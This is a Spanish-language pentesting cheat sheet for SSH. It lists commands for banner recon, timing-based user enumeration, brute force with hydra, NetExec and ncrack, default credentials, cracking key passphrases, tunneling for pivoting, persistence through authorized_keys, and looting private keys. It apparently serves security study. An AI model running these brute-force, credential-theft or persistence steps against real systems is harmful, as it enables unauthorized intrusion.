---
tipo: meta
aliases:
  - SSH - matriz
  - ssh cheatsheet
tags:
  - meta/referencia
  - dominio/red
---

# SSH - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 22/tcp**. Acceso remoto por excelencia — y, cuando ya entraste, la mejor vía de **pivoting** (túneles). Criterio de recon en [[MOC - Reconocimiento de red]]. El pivoting como dominio propio queda pendiente; acá van los flags de SSH.

`HOST`, `u`, `p` son marcadores.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nc -nv HOST 22` | Banner → versión de OpenSSH (mapea a CVEs) |
| `nmap -sV --script "ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" -p22 HOST` | Algoritmos, host key y **qué métodos de auth acepta** |
| `ssh -v u@HOST` | Los métodos ofrecidos, en la salida de debug |

`ssh-auth-methods` dice si acepta `password` (se puede forzar) o solo `publickey` (necesitás una clave).

## Enumeración de usuarios

OpenSSH viejo (CVE-2018-15473) filtra usuarios válidos por diferencia de tiempo.

| Comando | Qué da |
|---|---|
| `msf> use auxiliary/scanner/ssh/ssh_enumusers` | Usuarios válidos por timing |

## Fuerza bruta

| Herramienta | Comando |
|---|---|
| hydra | `hydra -L users.txt -P pass.txt ssh://HOST` |
| NetExec | `nxc ssh HOST -u users.txt -p pass.txt --continue-on-success` |
| ncrack | `ncrack -U users.txt -P pass.txt ssh://HOST` |

Credenciales por defecto que valen probar: `root:root`, `root:toor`, `admin:admin`, `pi:raspberry`, `ubnt:ubnt`.

## Con clave privada

| Tarea | Comando |
|---|---|
| Conectar con clave | `chmod 600 id_rsa` → `ssh -i id_rsa u@HOST` |
| Ejecutar un comando | `ssh -i id_rsa u@HOST 'id'` |
| Crackear una clave con passphrase | `ssh2john id_rsa > hash` → `john --wordlist=w.txt hash` |

`ssh` **exige permisos 600** en la clave o la ignora ("UNPROTECTED PRIVATE KEY FILE"). Una `id_rsa` encontrada en un share o backup es acceso directo.

## Túneles / pivoting

Los flags de reenvío de SSH — el pivoting real vive en su propio dominio (pendiente), pero la sintaxis es esta.

| Tipo | Comando | Para qué |
|---|---|---|
| Local (`-L`) | `ssh -L 8080:interno:80 u@HOST` | Alcanzo `interno:80` en mi `localhost:8080` |
| Remoto (`-R`) | `ssh -R 8080:localhost:80 u@HOST` | Expongo mi servicio en el HOST |
| Dinámico (`-D`) | `ssh -D 1080 u@HOST` | SOCKS por el HOST (+ `proxychains`) |
| Jump (`-J`) | `ssh -J u@PIVOTE u@DESTINO` | Salto a través de un host intermedio |

## Configuración (con acceso al host)

| Archivo | Qué tiene |
|---|---|
| `/etc/ssh/sshd_config` | Config del servidor: root login, métodos, forwarding |
| `~/.ssh/authorized_keys` | Claves autorizadas — **agregar la tuya = persistencia** |
| `~/.ssh/id_rsa` · `id_ed25519` | Claves privadas del usuario — loot y movimiento lateral |
| `~/.ssh/known_hosts` | A qué hosts se conectó — mapa de objetivos siguientes |

### Configuraciones peligrosas en `sshd_config`

| Directiva | Por qué importa |
|---|---|
| `PermitRootLogin yes` | Login directo de root por SSH |
| `PasswordAuthentication yes` | Habilita la fuerza bruta de contraseñas |
| `PermitEmptyPasswords yes` | Cuentas sin contraseña entran |
| `AllowTcpForwarding yes` | Habilita el pivoting por túnel |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `Permissions 0644 ... too open` | la clave no está en 600 | `chmod 600 id_rsa` |
| `Permission denied (publickey)` | solo acepta clave, no tenés una | conseguir una `id_rsa`, o revisar auth-methods |
| `no matching host key type` | cliente nuevo vs server viejo | `-o HostKeyAlgorithms=+ssh-rsa` |
| `no matching key exchange method` | ídem con el KEX | `-o KexAlgorithms=+diffie-hellman-group1-sha1` |
